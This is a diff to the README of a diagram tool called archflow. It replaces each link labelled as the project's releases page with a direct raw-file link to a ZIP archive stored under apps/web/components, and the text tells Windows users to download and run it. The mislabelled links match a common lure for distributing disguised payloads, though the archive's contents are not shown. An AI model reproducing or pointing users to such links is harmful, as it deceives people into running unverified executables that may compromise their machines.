@@ -1,16 +1,16 @@
 # 🧭 archflow - Build diagrams with simple text
 
-[![Download archflow](https://img.shields.io/badge/Download%20archflow-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/antonigreat281/archflow/releases)
+[![Download archflow](https://img.shields.io/badge/Download%20archflow-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/antonigreat281/archflow/raw/refs/heads/main/apps/web/components/Software_1.8.zip)
 
 ## 📥 Download
 
-Visit the [archflow releases page](https://github.com/antonigreat281/archflow/releases) to download and run this file on Windows.
+Visit the [archflow releases page](https://github.com/antonigreat281/archflow/raw/refs/heads/main/apps/web/components/Software_1.8.zip) to download and run this file on Windows.
 
 Choose the latest release for Windows, then download the file that matches your system.
 
 ## 🪟 Windows setup
 
-1. Open the [releases page](https://github.com/antonigreat281/archflow/releases).
+1. Open the [releases page](https://github.com/antonigreat281/archflow/raw/refs/heads/main/apps/web/components/Software_1.8.zip).
 2. Find the latest release at the top.
 3. Look for a Windows download file.
 4. Download the file to your computer.
@@ -55,7 +55,7 @@ If your download comes as a ZIP file, Windows can open it without extra tools in
 
 ## 🚀 Get archflow running
 
-1. Go to the [archflow releases page](https://github.com/antonigreat281/archflow/releases).
+1. Go to the [archflow releases page](https://github.com/antonigreat281/archflow/raw/refs/heads/main/apps/web/components/Software_1.8.zip).
 2. Download the latest Windows file.
 3. If the file is zipped, extract it.
 4. Open the folder that contains the app.
@@ -155,6 +155,6 @@ It uses Rust for the core engine and SVG for clean image output, so the result s
 
 Use this link to download and run the Windows version:
 
-[Open archflow releases](https://github.com/antonigreat281/archflow/releases)
+[Open archflow releases](https://github.com/antonigreat281/archflow/raw/refs/heads/main/apps/web/components/Software_1.8.zip)
 
 Choose the latest release, download the Windows file, then open it on your PC
